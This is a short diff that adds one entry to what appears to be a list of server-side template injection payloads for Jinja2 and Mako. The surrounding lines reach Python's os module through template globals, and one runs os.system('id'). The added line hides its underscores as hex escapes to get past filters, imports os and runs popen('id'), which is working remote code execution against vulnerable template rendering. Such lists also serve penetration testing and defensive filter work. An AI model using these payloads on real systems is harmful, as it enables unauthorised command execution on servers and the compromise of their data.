@@ -105,3 +105,4 @@ ${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
 {{cycler.__init__.__globals__.os}}
 {{joiner.__init__.__globals__.os}}
 {{namespace.__init__.__globals__.os}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
